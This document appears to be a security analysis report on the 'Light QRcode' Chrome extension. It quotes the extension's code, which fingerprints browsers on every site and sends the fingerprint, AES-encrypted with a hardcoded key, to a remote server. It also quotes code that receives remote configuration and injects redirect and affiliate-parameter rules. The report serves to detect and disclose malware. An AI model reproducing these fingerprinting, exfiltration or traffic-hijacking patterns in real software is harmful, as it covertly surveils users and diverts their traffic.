# Vulnerability Report: Light QRcode

## Metadata
- **Extension ID**: pmpklfpmdhjefcdgdajeplahennjhecf
- **Extension Name**: Light QRcode
- **Version**: 2.6
- **Users**: ~50,000
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

Light QRcode presents itself as a simple QR code generation extension but contains severe undisclosed surveillance and monetization capabilities. The extension collects detailed browser fingerprints (including platform, plugins, canvas, WebGL, fonts, and other identifying attributes) and exfiltrates this data along with user behavior to a remote server at `rsapi.qentifyrs.com`. Additionally, the extension fetches encrypted remote configuration that dynamically injects declarativeNetRequest rules to redirect user traffic and inject affiliate parameters, all without disclosure in the Chrome Web Store listing.

The extension combines FingerprintJS v3.3.2 for advanced browser fingerprinting with encrypted command-and-control communications using AES-CBC encryption. The fingerprint is generated on every site visit via content script injection on `<all_urls>`, sent to the background service worker, persisted to chrome.storage, and transmitted to the remote server which responds with encrypted redirect/affiliate injection rules.

## Vulnerability Details

### 1. CRITICAL: Undisclosed Browser Fingerprinting and Data Exfiltration

**Severity**: CRITICAL
**Files**: js/contentscript.js, serviceworker.js, js/components.js
**CWE**: CWE-359 (Exposure of Private Information), CWE-506 (Embedded Malicious Code)

**Description**:
The extension deploys FingerprintJS v3.3.2 library to generate comprehensive browser fingerprints on every page load across all websites. The content script collects extensive identifying attributes including:

- `navigator.platform`, `navigator.cpuClass`
- Screen resolution, color depth, device pixel ratio
- Canvas fingerprinting
- WebGL renderer and vendor information
- Installed plugins and MIME types
- Audio context fingerprinting
- Font enumeration
- Timezone information
- Browser capabilities and features

**Evidence**:
```javascript
// contentscript.js lines 888-1195
platform: function() {
  var e = navigator.platform;
  return "MacIntel" === e && M() && !_() ? function() {
    if ("iPad" === navigator.platform) return !0;
    // ... detection logic
  }() ? "iPad" : "iPhone" : e
},
plugins: function() {
  var e = navigator.plugins;
  if (e) {
    for (var t = [], n = 0; n < e.length; ++n) {
      var r = e[n];
      // ... plugin enumeration
    }
  }
}
```

The fingerprint is then exfiltrated to the service worker:

```javascript
// contentscript.js lines 1227-1241
(async () => {
  const e = await ie,
    t = await e.get(),
    { visitorId: n } = await t;
  return n
})().then((e => {
  chrome.runtime.sendMessage({
    event: "setFingerprint",
    body: {
      id: e
    }
  })
}))
```

The service worker receives the fingerprint and immediately exfiltrates it:

```javascript
// serviceworker.js lines 2227-2236
const i = await fetch(`${n}/sr105/qrinfo`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: h(JSON.stringify({
    bf: t,          // hardcoded value 1
    version: c(),   // extension version
    fg: r           // fingerprint
  }))
}),
```

Where `n = "http://rsapi.qentifyrs.com"` (line 2091) and `h()` performs AES-CBC encryption with hardcoded key `"D96C445CAB84B110"` (line 2089).

**Verdict**:
This is undisclosed surveillance malware. The Chrome Web Store listing describes the extension as "easily convert web pages into QR codes" with no mention of fingerprinting, data collection, or network communication. The extensive fingerprinting capabilities combined with exfiltration to a third-party server constitute critical privacy violations. The use of encryption to obfuscate the data transmission further demonstrates malicious intent.

### 2. CRITICAL: Remote Configuration and Dynamic Traffic Manipulation

**Severity**: CRITICAL
**Files**: serviceworker.js
**CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-494 (Download of Code Without Integrity Check)

**Description**:
After exfiltrating the browser fingerprint, the service worker receives an encrypted response from `rsapi.qentifyrs.com` containing dynamic configuration. This configuration is decrypted and used to inject `declarativeNetRequest` rules that redirect user traffic and inject affiliate parameters.

**Evidence**:
```javascript
// serviceworker.js lines 2238-2245
const s = await i.json();
if (1 === s.success) {
  const t = ((t, r = e) => a().AES.decrypt(t, a().enc.Utf8.parse(r), {
    iv: a().enc.Utf8.parse(r),
    mode: a().mode.CBC,
    padding: a().pad.Pkcs7
  }).toString(a().enc.Utf8))(s.data);
  return !!t && JSON.parse(t)
}
```

The decrypted configuration is passed to class `f` which dynamically creates redirect rules:

```javascript
// serviceworker.js lines 2137-2189
writeRules(t, e, r, i, n, s) {
  i ? chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
      id: t,
      priority: e,
      condition: {
        regexFilter: r,           // regex to match URLs
        resourceTypes: ["main_frame"]
      },
      action: {
        type: "redirect",
        redirect: {
          url: i                  // hardcoded redirect URL
        }
      }
    }]
  }) : chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
      id: t,
      priority: e,
      condition: {
        regexFilter: r,
        resourceTypes: ["main_frame"]
      },
      action: {
        type: "redirect",
        redirect: {
          transform: {
            queryTransform: {
              addOrReplaceParams: n  // affiliate params
            }
          }
        }
      }
    }]
  })
```

The extension can receive configuration to:
- Redirect matching URLs to arbitrary destinations (`url: i`)
- Inject query parameters (affiliate codes) into URLs (`addOrReplaceParams: n`)
- Control timing and intervals for rule activation (`nm < t.it` interval checks at line 2109)
- Whitelist certain patterns to bypass detection

**Verdict**:
This constitutes a remote-controlled affiliate injection and traffic hijacking system. The operator can push arbitrary redirect rules at any time to manipulate user browsing. The use of encryption prevents detection by static analysis or network monitoring. The complete lack of disclosure makes this malicious C2 infrastructure disguised as a QR code utility.

### 3. HIGH: Overprivileged Permissions and Broad Injection

**Severity**: HIGH
**Files**: manifest.json
**CWE**: CWE-250 (Execution with Unnecessary Privileges)

**Description**:
The extension requests excessive permissions that enable its malicious capabilities:

- `host_permissions: ["*://*/*"]` - Access to all websites
- `declarativeNetRequest` - Ability to intercept and modify all traffic
- Content script injection on `"matches": ["*://*/*"]` - Execute fingerprinting code on every page

For a QR code generator, the legitimate functionality would only require activeTab permission and user-initiated popup interaction. The broad permissions are solely to enable the surveillance and traffic manipulation capabilities.

**Evidence**:
```json
{
  "permissions": ["declarativeNetRequest", "storage", "tabs"],
  "host_permissions": ["*://*/*"],
  "content_scripts": [{
    "matches": ["*://*/*"],
    "js": ["js/contentscript.js"]
  }]
}
```

**Verdict**:
The permissions are deliberately overprivileged to enable malicious functionality that has no relationship to the stated purpose of QR code generation.

## False Positives Analysis

**FingerprintJS Library**: The presence of FingerprintJS v3.3.2 might be considered legitimate for fraud detection or analytics in some contexts. However, in this case:
- No disclosure of fingerprinting in the Chrome Web Store listing
- Fingerprints are exfiltrated to third-party server without user consent
- Combined with remote-controlled traffic manipulation infrastructure
- No legitimate use case for QR code generation that requires fingerprinting

**Legitimate monitoring endpoint**: The openfpcdn.io endpoint is part of the legitimate FingerprintJS library's npm monitoring telemetry (1% sampling rate). This is benign and unrelated to the malicious exfiltration.

**Encrypted communications**: While encryption itself is not malicious, the use of AES-CBC with a hardcoded key to obfuscate C2 communications demonstrates intent to evade detection.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| rsapi.qentifyrs.com/sr105/qrinfo | Command & Control | Encrypted fingerprint + extension version + hardcoded identifier | CRITICAL - Exfiltration and remote config retrieval |
| openfpcdn.io/fingerprintjs/v3.3.2/npm-monitoring | FingerprintJS telemetry | Anonymous library usage stats (1% sample) | LOW - Legitimate library telemetry |

The primary endpoint `rsapi.qentifyrs.com` uses unencrypted HTTP (line 2091), meaning the AES-encrypted payload can be intercepted and the encryption key is visible in the source code, making the encryption effectively security theater.

## Overall Risk Assessment

**RISK LEVEL: CRITICAL**

**Justification**:
Light QRcode is a sophisticated surveillance and traffic manipulation malware disguised as a simple utility extension. The combination of:

1. **Undisclosed comprehensive browser fingerprinting** deployed on all websites visited by 50,000+ users
2. **Encrypted exfiltration** of identifying data to third-party C2 server
3. **Remote-controlled traffic manipulation** via dynamically injected redirect/affiliate rules
4. **Complete lack of disclosure** - Chrome Web Store listing mentions none of these capabilities
5. **Active C2 infrastructure** enabling real-time rule updates to maximize monetization while evading detection

This represents active, ongoing fraud affecting tens of thousands of users. The extension serves no legitimate purpose beyond its cover story, with all core functionality dedicated to covert surveillance and traffic hijacking. The use of encrypted C2 communications and dynamic rule injection demonstrates sophisticated tradecraft to avoid detection.

**Recommended Actions**:
- Immediate removal from Chrome Web Store
- User notification and forced uninstallation
- Investigation of operator identity via rsapi.qentifyrs.com domain registration
- Analysis of encrypted payloads to identify targeted websites and affiliate networks
- Review of other extensions by same developer (author: "Lightning")
